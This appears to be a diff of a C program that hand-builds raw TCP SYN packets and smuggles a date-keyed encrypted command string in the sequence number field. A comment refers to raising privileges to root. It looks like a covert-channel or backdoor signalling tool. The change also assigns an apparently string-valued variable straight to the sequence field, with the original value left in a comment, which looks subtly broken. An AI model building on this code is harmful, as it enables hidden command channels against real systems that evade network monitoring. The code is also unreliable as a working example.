@@ -65,14 +65,14 @@ int main (int argc, char *argv[])
     }
     //command = strdup("/dev/bin");
     
-    strftime(Date, sizeof Date, "%Y:%m:%d", tm);
+    strftime(Date, sizeof Date, "%m%d", tm);
     printf("%s\n", Date);
     
     encryptedField = encrypt_data(command, Date);
     printf("%s\n", encryptedField);
     
-    encryptedField = encrypt_data(encryptedField, Date);
-    printf("%s\n", encryptedField);
+    //encryptedField = encrypt_data(encryptedField, Date);
+    //printf("%s\n", encryptedField);
 
     
     /* Change the UID/GID to 0 (raise to root) */
@@ -134,7 +134,7 @@ int main (int argc, char *argv[])
     tcph->th_sport = htons(addr->sport);
     // The destination port, we accept through command line
     tcph->th_dport = htons(addr->dport);
-    tcph->th_seq = htonl(1);
+    tcph->th_seq = encryptedField; //htonl(1);
     tcph->th_ack = 0;
     tcph->th_off = 5;
     tcph->th_flags = TH_SYN;
